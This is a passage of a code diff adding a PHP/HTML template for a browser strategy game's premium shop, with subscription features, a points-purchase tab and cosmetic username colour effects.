+                    <a href="game.php?village=<?= $village['id'] ?>&screen=premium&tab=<?= $tab_key ?>">
+                        <?= $tab_name ?>
+                    </a>
+                <?php endif; ?>
+            </th>
+        <?php endforeach; ?>
+    </tr>
+</table>
+
+<br />
+
+<?php if ($tab === 'subscriptions'): ?>
+    <!-- Premium Features Grid -->
+    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px;">
+
+        <!-- Premium Account -->
+        <div class="premium-card"
+            style="border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;">
+            <div
+                style="background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;">
+                <strong><?= __('screens.premium.premium_account') ?></strong>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img src="/graphic/new/premium/Premium_large.webp" alt="Crown" style="width: 120px; height: 120px;" />
+            </div>
+
+            <div style="margin: 15px 0;">
+                <strong><?= __('screens.premium.premium_account_desc') ?></strong>
+            </div>
+
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><?= __('screens.premium.more_build_orders') ?></li>
+                <li><?= __('screens.premium.map_improvements') ?></li>
+                <li><?= __('screens.premium.village_overview') ?></li>
+                <li><a class="nowrap" href=""><?= __('screens.premium.and_more') ?></a></li>
+            </ul>
+            <!--
+            <div style="margin: 15px 0; text-align: center;">
+                <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" />
+                <select name="duration_premium" style="width: 80px;">
+                    <option value="30">30 dias</option>
+                    <option value="90">90 dias</option>
+                    <option value="180">180 dias</option>
+                </select>
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong>200 pontos</strong>
+            </div>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                    onclick="const duration = document.querySelector('select[name=duration_wood]').value; activateFeature('wood_production', duration, 150)">Ativar agora</button>
+            </div>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn" style="background: #8B4513; color: white; padding: 5px 15px;">Comprar como
+                    presente</button>
+            </div>-->
+        </div>
+
+        <!-- Account Manager -->
+        <div class="premium-card"
+            style="border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px; position: relative;">
+            <?php if (!empty($active_features['account_manager'])): ?>
+                <div style="position: absolute; top: 10px; right: 10px; font-size: 48px; color: green;">✓</div>
+            <?php endif; ?>
+
+            <div
+                style="background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;">
+                <strong><?= __('screens.premium.account_manager') ?></strong>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img src="/graphic/new/premium/AccountManager_large.webp" alt="Account Manager"
+                    style="width: 120px; height: 120px;" />
+            </div>
+
+            <div style="margin: 15px 0;">
+                <strong><?= __('screens.premium.account_manager_desc') ?></strong>
+            </div>
+
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><?= __('screens.premium.manage_buildings') ?></li>
+                <li><?= __('screens.premium.manage_recruitment') ?></li>
+                <li><?= __('screens.premium.includes_farm_assistant') ?></li>
+                <li><a class="nowrap" href=""><?= __('screens.premium.and_more') ?></a></li>
+            </ul>
+
+            <div style="margin: 15px 0; text-align: center;">
+                <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" />
+                <select name="duration_manager" style="width: 80px;">
+                    <option value="90"><?= __('screens.premium.90_days') ?></option>
+                    <option value="30"><?= __('screens.premium.30_days') ?></option>
+                    <option value="14"><?= __('screens.premium.14_days') ?></option>
+                    <option value="7"><?= __('screens.premium.7_days') ?></option>
+                    <option value="3"><?= __('screens.premium.3_days') ?></option>
+                </select>
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong id="cost_manager">200 pontos</strong>
+            </div>
+
+            <?php if (!empty($active_features['account_manager'])): ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_manager]').value; activateFeature('account_manager', duration, 200)"><?= __('screens.premium.extend_now') ?></button>
+                </div>
+
+                <div style="background: #E7F3FF; border: 1px solid #2196F3; padding: 10px; margin-top: 10px;">
+                    <img src="/graphic/icons/questionmark.png" style="vertical-align: middle;" />
+                    <input type="checkbox" id="auto_renew_accountmanager" <?= !empty($user['account_manager_auto_renew']) ? 'checked' : '' ?> onchange="toggleAutoRenew('account_manager', this.checked)" />
+                    <?= __('screens.premium.auto_renew') ?>
+                    <br />
+                    <small><?= __('screens.premium.expires') ?>         <?php
+                               if (isset($active_features['account_manager']['expires'])) {
+                                   $expires = $active_features['account_manager']['expires'];
+                                   if (!is_numeric($expires)) {
+                                       $expires = strtotime($expires);
+                                   }
+                                   echo date('M d, H:i', $expires);
+                               }
+                               ?></small>
+                </div>
+            <?php else: ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_manager]').value; activateFeature('account_manager', duration, 200)"><?= __('screens.premium.activate_now') ?></button>
+                </div>
+            <?php endif; ?>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn"
+                    style="background: #8B4513; color: white; padding: 5px 15px;"><?= __('screens.premium.buy_as_gift') ?></button>
+            </div>
+
+            <!-- <div style="background: #FFE4E1; border: 1px solid #FF6347; padding: 10px; margin-top: 10px; font-size: 12px;">
+                <strong>Precisa de ter uma conta Premium e 5 aldeias para poder ativar o gestor de conta.</strong>
+            </div>-->
+        </div>
+
+        <!-- Farm Assistant -->
+        <div class="premium-card"
+            style="border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px; position: relative;">
+            <?php if (!empty($active_features['farm_assistant'])): ?>
+                <div style="position: absolute; top: 10px; right: 10px; font-size: 48px; color: green;">✓</div>
+            <?php endif; ?>
+
+            <div
+                style="background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;">
+                <strong><?= __('screens.premium.farm_assistant') ?></strong>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img src="/graphic/new/premium/FarmAssistent_large.webp" alt="Farm Assistant"
+                    style="width: 120px; height: 120px;" />
+            </div>
+
+            <div style="margin: 15px 0;">
+                <strong><?= __('screens.premium.farm_assistant_desc') ?></strong>
+            </div>
+
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><a class="nowrap" href=""><?= __('screens.premium.see_details') ?></a></li>
+            </ul>
+
+            <div style="margin: 15px 0; text-align: center;">
+                <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" />
+                <select name="duration_farm" style="width: 80px;">
+                    <option value="90"><?= __('screens.premium.90_days') ?></option>
+                    <option value="30"><?= __('screens.premium.30_days') ?></option>
+                    <option value="14"><?= __('screens.premium.14_days') ?></option>
+                    <option value="7"><?= __('screens.premium.7_days') ?></option>
+                    <option value="3"><?= __('screens.premium.3_days') ?></option>
+                </select>
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong id="cost_farm">30 pontos</strong>
+            </div>
+
+            <?php if (!empty($active_features['farm_assistant'])): ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_farm]').value; activateFeature('farm_assistant', duration, 30)"><?= __('screens.premium.extend_now') ?></button>
+                </div>
+
+                <div style="background: #E7F3FF; border: 1px solid #2196F3; padding: 10px; margin-top: 10px;">
+                    <img src="/graphic/icons/questionmark.png" style="vertical-align: middle;" />
+                    <input type="checkbox" id="auto_renew_farm" <?= !empty($user['farm_assistant_auto_renew']) ? 'checked' : '' ?> onchange="toggleAutoRenew('farm_assistant', this.checked)" /> <?= __('screens.premium.auto_renew') ?>
+                    <br />
+                    <small><?= __('screens.premium.expires') ?>         <?php
+                               if (isset($active_features['farm_assistant']['expires'])) {
+                                   $expires = $active_features['farm_assistant']['expires'];
+                                   // Convert to timestamp if it's a DATETIME string
+                                   if (!is_numeric($expires)) {
+                                       $expires = strtotime($expires);
+                                   }
+                                   echo date('M d, H:i', $expires);
+                               }
+                               ?></small>
+                </div>
+            <?php else: ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_farm]').value; activateFeature('farm_assistant', duration, 30)"><?= __('screens.premium.activate_now') ?></button>
+                </div>
+            <?php endif; ?>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn"
+                    style="background: #8B4513; color: white; padding: 5px 15px;"><?= __('screens.premium.buy_as_gift') ?></button>
+            </div>
+        </div>
+
+        <!-- Wood Production +20% -->
+        <div class="premium-card"
+            style="border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px; position: relative;">
+            <?php if (!empty($active_features['wood_production'])): ?>
+                <div style="position: absolute; top: 10px; right: 10px; font-size: 48px; color: green;">✓</div>
+            <?php endif; ?>
+
+            <div
+                style="background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;">
+                <strong><?= __('screens.premium.wood_production_title') ?></strong>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img src="/graphic/new/premium/WoodProduction_large.webp" alt="Wood" style="width: 80px; height: 80px;" />
+            </div>
+
+            <div style="margin: 15px 0;">
+                <strong><?= __('screens.premium.wood_production_desc') ?></strong>
+            </div>
+
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><?= __('screens.premium.in_all_villages') ?></li>
+            </ul>
+
+            <div style="margin: 15px 0; text-align: center;">
+                <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" />
+                <select name="duration_wood" style="width: 80px;">
+                    <option value="90"><?= __('screens.premium.90_days') ?></option>
+                    <option value="30"><?= __('screens.premium.30_days') ?></option>
+                </select>
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong>150 <?= __('screens.premium.points') ?></strong>
+            </div>
+
+            <?php if (!empty($active_features['wood_production'])): ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_wood]').value; activateFeature('wood_production', duration, 150)"><?= __('screens.premium.extend_now') ?></button>
+                </div>
+                <div style="background: #E7F3FF; border: 1px solid #2196F3; padding: 10px; margin-top: 10px;">
+                    <input type="checkbox" id="auto_renew_woodproduction" <?= !empty($user['wood_production_auto_renew']) ? 'checked' : '' ?> onchange="toggleAutoRenew('wood_production', this.checked)" />
+                    <?= __('screens.premium.auto_renew') ?>
+                    <br />
+                    <small><?= __('screens.premium.expires') ?>
+                        <?php if (isset($active_features['wood_production']['expires'])) {
+                            $expires = $active_features['wood_production']['expires'];
+                            echo date('M d, H:i', is_numeric($expires) ? $expires : strtotime($expires));
+                        } ?></small>
+                </div>
+            <?php else: ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_wood]').value; activateFeature('wood_production', duration, 150)"><?= __('screens.premium.activate_now') ?></button>
+                </div>
+            <?php endif; ?>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn"
+                    style="background: #8B4513; color: white; padding: 5px 15px;"><?= __('screens.premium.buy_as_gift') ?></button>
+            </div>
+        </div>
+
+        <!-- Clay Production +20% -->
+        <div class="premium-card"
+            style="border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px; position: relative;">
+            <?php if (!empty($active_features['clay_production'])): ?>
+                <div style="position: absolute; top: 10px; right: 10px; font-size: 48px; color: green;">✓</div>
+            <?php endif; ?>
+
+            <div
+                style="background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;">
+                <strong><?= __('screens.premium.clay_production_title') ?></strong>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img src="/graphic/new/premium/StoneProduction_large.webp" alt="Clay" style="width: 80px; height: 80px;" />
+            </div>
+
+            <div style="margin: 15px 0;">
+                <strong><?= __('screens.premium.clay_production_desc') ?></strong>
+            </div>
+
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><?= __('screens.premium.in_all_villages') ?></li>
+            </ul>
+
+            <div style="margin: 15px 0; text-align: center;">
+                <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" />
+                <select name="duration_clay" style="width: 80px;">
+                    <option value="90"><?= __('screens.premium.90_days') ?></option>
+                    <option value="30"><?= __('screens.premium.30_days') ?></option>
+                </select>
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong>150 <?= __('screens.premium.points') ?></strong>
+            </div>
+
+            <?php if (!empty($active_features['clay_production'])): ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_clay]').value; activateFeature('clay_production', duration, 150)"><?= __('screens.premium.extend_now') ?></button>
+                </div>
+                <div style="background: #E7F3FF; border: 1px solid #2196F3; padding: 10px; margin-top: 10px;">
+                    <input type="checkbox" id="auto_renew_clayproduction" <?= !empty($user['clay_production_auto_renew']) ? 'checked' : '' ?> onchange="toggleAutoRenew('clay_production', this.checked)" />
+                    <?= __('screens.premium.auto_renew') ?>
+                    <br />
+                    <small><?= __('screens.premium.expires') ?>
+                        <?php if (isset($active_features['clay_production']['expires'])) {
+                            $expires = $active_features['clay_production']['expires'];
+                            echo date('M d, H:i', is_numeric($expires) ? $expires : strtotime($expires));
+                        } ?></small>
+                </div>
+            <?php else: ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_clay]').value; activateFeature('clay_production', duration, 150)"><?= __('screens.premium.activate_now') ?></button>
+                </div>
+            <?php endif; ?>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn"
+                    style="background: #8B4513; color: white; padding: 5px 15px;"><?= __('screens.premium.buy_as_gift') ?></button>
+            </div>
+        </div>
+
+        <!-- Iron Production +20% -->
+        <div class="premium-card"
+            style="border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px; position: relative;">
+            <?php if (!empty($active_features['iron_production'])): ?>
+                <div style="position: absolute; top: 10px; right: 10px; font-size: 48px; color: green;">✓</div>
+            <?php endif; ?>
+
+            <div
+                style="background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;">
+                <strong><?= __('screens.premium.iron_production_title') ?></strong>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <img src="/graphic/new/premium/IronProduction_large.webp" alt="Iron" style="width: 80px; height: 80px;" />
+            </div>
+
+            <div style="margin: 15px 0;">
+                <strong><?= __('screens.premium.iron_production_desc') ?></strong>
+            </div>
+
+            <ul style="margin: 10px 0; padding-left: 20px;">
+                <li><?= __('screens.premium.in_all_villages') ?></li>
+            </ul>
+
+            <div style="margin: 15px 0; text-align: center;">
+                <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" />
+                <select name="duration_iron" style="width: 80px;">
+                    <option value="90">90 dias</option>
+                    <option value="30">30 dias</option>
+                </select>
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong>150 <?= __('screens.premium.points') ?></strong>
+            </div>
+
+            <?php if (!empty($active_features['iron_production'])): ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_iron]').value; activateFeature('iron_production', duration, 150)"><?= __('screens.premium.extend_now') ?></button>
+                </div>
+                <div style="background: #E7F3FF; border: 1px solid #2196F3; padding: 10px; margin-top: 10px;">
+                    <input type="checkbox" id="auto_renew_ironproduction" <?= !empty($user['iron_production_auto_renew']) ? 'checked' : '' ?> onchange="toggleAutoRenew('iron_production', this.checked)" />
+                    <?= __('screens.premium.auto_renew') ?>
+                    <br />
+                    <small><?= __('screens.premium.expires') ?>
+                        <?php if (isset($active_features['iron_production']['expires'])) {
+                            $expires = $active_features['iron_production']['expires'];
+                            echo date('M d, H:i', is_numeric($expires) ? $expires : strtotime($expires));
+                        } ?></small>
+                </div>
+            <?php else: ?>
+                <div style="text-align: center; margin: 10px 0;">
+                    <button class="btn" style="background: green; color: white; padding: 8px 20px;"
+                        onclick="const duration = document.querySelector('select[name=duration_iron]').value; activateFeature('iron_production', duration, 150)"><?= __('screens.premium.activate_now') ?></button>
+                </div>
+            <?php endif; ?>
+
+            <div style="text-align: center; margin: 10px 0;">
+                <button class="btn"
+                    style="background: #8B4513; color: white; padding: 5px 15px;"><?= __('screens.premium.buy_as_gift') ?></button>
+            </div>
+        </div>
+
+    </div>
+
+<?php elseif ($tab === 'buy'): ?>
+    <!-- Premium Purchase Content - Modern Design -->
+    <style>
+        .premium-buy-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .premium-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .premium-header h2 {
+            font-size: 32px;
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .premium-header p {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+
+        .premium-packages {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(15%, 1fr));
+            gap: 2px;
+            margin-bottom: 40px;
+        }
+
+        .premium-package {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .premium-package:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            border-color: #3498db;
+        }
+
+        .premium-package.popular {
+            border-color: #f39c12;
+            background: linear-gradient(135deg, #fff 0%, #fff9e6 100%);
+        }
+
+        .premium-package.popular::before {
+            content: "Mais Popular";
+            position: absolute;
+            top: 15px;
+            right: -35px;
+            background: #f39c12;
+            color: white;
+            padding: 5px 40px;
+            transform: rotate(45deg);
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .package-bonus {
+            background: #27ae60;
+            color: #8B4513;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .package-image {
+            width: 120px;
+            height: 120px;
+            margin: 15px auto;
+            display: block;
+        }
+
+        .package-points {
+            font-size: 48px;
+            font-weight: bold;
+            color: #2c3e50;
+            margin: 10px 0;
+        }
+
+        .package-label {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .package-price {
+            background: #3498db;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        .premium-package.popular .package-price {
+            background: #f39c12;
+        }
+
+        .payment-section {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .payment-section h3 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+
+        .payment-method {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .payment-select {
+            flex: 1;
+            min-width: 250px;
+        }
+
+        .payment-select select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            background: white;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+
+        .payment-select select:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+
+        .payment-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .payment-checkbox input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .help-button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+
+        .help-button:hover {
+            background: #2980b9;
+        }
+
+        .footer-links {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-links a {
+            color: #3498db;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 13px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-note {
+            color: #95a5a6;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+
+    <!-- buy tab: auto-open modal + static footer links so navigation works -->
+    <div style="text-align: center; padding: 30px;">
+        <p style="font-size: 16px; margin-bottom: 20px;"><?= __('screens.premium.get_premium_points') ?></p>
+        <button class="btn" style="background: #8B4513; color: white; font-size: 16px; padding: 12px 30px;" onclick="openPurchaseModal()">
+            <?= __('screens.premium.get_premium_points') ?>
+        </button>
+    </div>
+
+    <!-- Static footer links - outside the modal so navigation always works -->
+    <div class="footer-links" style="margin-top: 30px;">
+        <a href="game.php?village=<?= $village['id'] ?>&screen=support"><?= __('screens.premium.support_request') ?></a>
+        |
+        <a href="game.php?village=<?= $village['id'] ?>&screen=terms"><?= __('screens.premium.general_terms') ?></a>
+        |
+        <a href="game.php?village=<?= $village['id'] ?>&screen=privacy"><?= __('screens.premium.data_protection') ?></a>
+        |
+        <a href="game.php?village=<?= $village['id'] ?>&screen=legal"><?= __('screens.premium.legal_info') ?></a>
+        <p class="footer-note"><?= __('screens.premium.prices_include_tax') ?></p>
+    </div>
+
+<?php elseif ($tab === 'cosmetics'): ?>
+    <!-- Cosmetics Tab -->
+    <div style='display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px;'>
+        <!-- Animated Scrolls (100 points) -->
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.animated_red') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/effect/name_effect_red.webp' alt='Red Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.red') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-animated-red"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: red; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('animation', 'red', 'vermelho')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.animated_blue') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/effect/name_effect_blue.webp' alt='Blue Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.blue') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-animated-blue"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: blue; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('animation', 'blue', 'azul')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.animated_pink') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/effect/name_effect_pink.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.pink') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-animated-pink"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: pink; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('animation', 'pink', 'rosa')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.animated_yellow') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/effect/name_effect_yellow.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.yellow') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-animated-yellow"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: yellow; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('animation', 'yellow', 'amarelo')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.animated_purple') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/effect/name_effect_roxo.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.purple') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-animated-purple"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: purple; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('animation', 'purple', 'roxo')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.animated_orange') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/effect/name_effect_orange.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.orange') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-animated-orange"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: orange; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('animation', 'orange', 'laranja')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+    </div>
+    </div>
+    <!-- Just color named-->
+    </br>
+    <div style='display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px;'>
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 25px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
